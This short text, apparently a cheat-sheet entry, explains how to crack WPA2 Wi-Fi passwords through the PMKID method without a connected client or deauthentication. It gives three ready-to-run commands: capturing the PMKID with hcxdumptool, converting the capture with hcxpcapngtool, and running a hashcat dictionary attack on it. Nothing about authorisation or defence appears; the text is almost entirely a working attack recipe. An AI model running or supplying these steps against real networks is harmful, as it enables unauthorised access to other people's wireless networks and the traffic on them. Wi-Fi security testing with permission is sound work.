This can be used to crack WPA2 networks without waiting for a client to connect or performing deauthentication attacks.

Capture the PMKID and save to pcapng file

hcxdumptool -i $interface -w pmkid.pcapng --rds=1 -c 6a

Then convert the capture to hashcat format

hcxpcapngtool -o hashes.hc22000 pmkid.pcapng

Crack with hashcat using a dictionary attack

hashcat -m 22000 hashes.hc22000 wordlist.txt
